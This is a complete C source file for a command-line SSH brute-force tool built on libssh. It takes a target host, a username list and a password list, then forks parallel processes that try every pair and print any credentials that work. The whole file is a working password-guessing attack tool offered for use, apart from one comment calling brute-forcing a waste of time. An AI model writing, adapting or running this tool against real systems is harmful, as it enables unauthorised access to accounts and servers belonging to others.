// gcc brute_ssh.c -o brute-ssh -lssh
// I know brute ssh is wast of time
// I update this just for fun

#include <libssh/libssh.h>
#include <sys/wait.h>

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <signal.h>

typedef struct {
    char *ptr;
    size_t len;
} line_t;

char *target;

int ssh_login(const char *user, const char *passwd){
    ssh_session ssh_id;
    int ret = 0;

    printf("[*] testing => %s:%s:%s\n", target, user, passwd);

    ssh_id = ssh_new();
    ssh_options_set(ssh_id, SSH_OPTIONS_HOST, target);
    ssh_options_set(ssh_id, SSH_OPTIONS_USER, user);

    if(ssh_connect(ssh_id) != SSH_OK){
        goto end;
    }

    if(ssh_userauth_password(ssh_id, NULL, passwd) != SSH_AUTH_SUCCESS){
        goto end;
    }

    printf("\n\n\tCracked --> [%s : %s]\n\n", user, passwd);

    ret = 1;

    end:
    ssh_disconnect(ssh_id);
    ssh_free(ssh_id);

    return ret;
}

void help(void){
    const char *banner=
        "brute-ssh [OPTIONS] [TARGET]\n\n"
        "Options:\n"
        " -u FILE      Username list\n"
        " -p FILE      Password list\n"
        " -t NUMBER    Number of simultaneous connections";

    puts(banner);
    exit(0);
}

int main(int argc,char **argv){
    char *userlist, *pwlist;
    FILE *ufh, *pfh;

    int threads, nthreads, opt, i, status;
    pid_t *pid, res;

    ssize_t npw, nuser;
    line_t pline, uline;

    userlist = pwlist = NULL;

    // default thread number
    threads = 10;

    while((opt = getopt(argc, argv, "u:p:t:")) != -1){
        switch(opt){
            case 'u':
                userlist = optarg;
                break;
            case 'p':
                pwlist = optarg;
                break;
            case 't':
                threads = atoi(optarg);
                break;
            default:
                return 1;
        }
    }

    target = argv[optind];

    if(!target || !threads || !userlist || !pwlist){
        help();
    }

    if((pid = calloc(threads, sizeof(pid_t))) == NULL){
        perror("calloc()");
        return 1;
    }

    if((pfh = fopen(pwlist, "r")) == NULL){
        perror("fopen()");
        return 1;
    }

    if((ufh = fopen(userlist, "r")) == NULL){
        perror("fopen()");
        return 1;
    }


    pline.ptr = uline.ptr = NULL;
    pline.len = uline.len = 0;
    nthreads = i = 0;

    printf("[+] starting ...\n");

    while((npw = getline(&pline.ptr, &pline.len, pfh)) > 0){
        // skip blank lines
        if(npw == 1 && pline.ptr[0] == '\n')
            continue;

        // chomp
        if(pline.ptr[npw-1] == '\n')
            pline.ptr[npw-1] = 0x0;

        while((nuser = getline(&uline.ptr, &uline.len, ufh)) > 0){
            if(nuser == 1 && uline.ptr[0] == '\n')
                continue;

            if(uline.ptr[nuser-1] == '\n')
                uline.ptr[nuser-1] = 0x0;

            // get next free position
            for(i=0; pid[i]; i++);

            pid[i] = fork();
            if(pid[i] == -1){
                // probably resource exhaustion
                perror("fork()");
                goto join;
            } else if(pid[i] == 0){
                _exit(ssh_login(uline.ptr, pline.ptr));
            }

            nthreads++;

            // maximum number of parallel process reachead
            // wait until a process finish
            while(threads == nthreads){
                res = waitpid(-1, &status, 0);
                nthreads--;

                // terminate all process if success
                if(status){
                    for(i=0; i<threads; i++){
                        if(pid[i])
                            kill(pid[i], SIGKILL);
                    }
                    goto end;
                }

                // get the position of the finished process
                for(i=0; pid[i] != res; i++);
                pid[i] = 0;

            }
        }

        rewind(ufh);
    }

    join:
    while(waitpid(-1, &status, 0) != -1){
        if(status){
            for(i=0; i<threads; i++){
                if(pid[i]){
                    kill(pid[i], SIGKILL);
                    break;
                }
            }
        }
    }

    end:
    printf("[+] finish\n");
    return 0;
}
